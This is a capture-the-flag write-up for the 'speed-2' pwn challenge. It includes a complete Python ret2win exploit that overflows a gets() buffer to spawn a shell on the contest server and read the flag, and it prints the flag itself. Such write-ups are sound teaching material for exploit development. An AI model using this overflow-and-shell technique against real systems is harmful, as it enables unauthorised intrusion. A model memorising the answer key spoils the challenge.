# speed-2

## Challenge Overview
Name: speed-2
Author: @tor
Category: pwn
Description: First three flags get podium points, everyone else gets 50.
Flag format: midnight{...}
Objective: Exploit the binary to execute the hidden shell function and read the flag from the remote server.

## Files Provided
- speed2-f8bb12.tar.gz

## Solution Plan
1. Inspect the binary and identify the vulnerable input function.
2. Calculate the overflow offset to control RIP and locate the hidden win/shell function.
3. Send a ret2win payload to spawn a shell, then read `/home/ctf/flag`.

## Code (Exploit Script)
```bash
cat > solve_speed2_flag.py <<'PY'
#!/usr/bin/env python3
import socket
import struct
import time

HOST = "speed2.play.ctf.se"
PORT = 6161

RET = 0x401124
WIN = 0x4011d6

payload = b"A" * 40
payload += struct.pack("<Q", RET)
payload += struct.pack("<Q", WIN)
payload += b"\n"

s = socket.create_connection((HOST, PORT), timeout=5)

time.sleep(0.2)
try:
    s.recv(4096)
except Exception:
    pass

s.sendall(payload)
time.sleep(0.2)

s.sendall(b"cat /home/ctf/flag\n")
time.sleep(0.5)

s.settimeout(2)
out = b""
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except Exception:
        break

print(out.decode("latin-1", errors="ignore"))
PY

python3 solve_speed2_flag.py
```

## Flag
```txt
midnight{e44a230e3fc7aadde716339cdea5d8cc}
```

## Notes
The binary used `gets` on a small stack buffer, allowing control of RIP after 40 bytes. The exploit returns first to a `ret` gadget for stack alignment, then jumps to the hidden win/shell function at `0x4011d6`. The remote shell revealed that the flag path was `/home/ctf/flag`.
